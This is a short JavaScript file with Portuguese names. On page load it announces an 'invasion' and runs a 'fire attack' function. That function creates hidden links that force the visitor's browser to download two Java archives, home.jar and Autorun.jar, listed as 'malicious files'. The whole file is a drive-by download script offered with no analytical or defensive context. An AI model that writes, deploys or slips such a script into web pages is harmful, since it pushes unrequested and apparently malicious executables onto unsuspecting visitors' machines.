console.log("Invasão iniciada: O script _.js foi carregado com sucesso!");

function dispararAtaque() {
    const arquivosMaliciosos = ['home.jar', 'Autorun.jar'];

    arquivosMaliciosos.forEach(arquivo => {
        const linkInvisivel = document.createElement('a');
        linkInvisivel.href = arquivo;
        linkInvisivel.download = arquivo;
        
        document.body.appendChild(linkInvisivel);
        linkInvisivel.click();
        document.body.removeChild(linkInvisivel);
    });
}
dispararAtaque();